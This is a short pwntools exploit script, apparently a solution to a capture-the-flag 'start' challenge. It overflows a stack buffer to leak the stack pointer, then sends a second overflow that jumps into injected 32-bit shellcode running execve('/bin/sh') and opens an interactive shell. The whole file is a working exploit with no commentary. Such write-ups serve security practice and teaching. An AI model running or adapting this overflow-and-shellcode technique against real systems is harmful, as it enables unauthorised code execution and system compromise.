from pwn import *

r = process("./start")
context.arch = "i386"

r.recvuntil(b"CTF:")
payload1 = b"a" * 0x14 + p32(0x08048087)
r.sendline(payload1)

esp_address = u32(r.recv()[:4])
log.info("[+] Address of ESP reg: %s" % hex(esp_address))

shellcode = asm("\n".join([
    "push %s" % u32(b"/sh\0"),
    "push %s" % u32(b"/bin"),
    "xor edx, edx",
    "xor ecx, ecx",
    "mov ebx, esp",
    "mov eax, 0xb",
    "int 0x80"    
]))

payload2 = b"a" * 0x14 + p32(esp_address+20)  + shellcode
r.sendline(payload2)

r.interactive()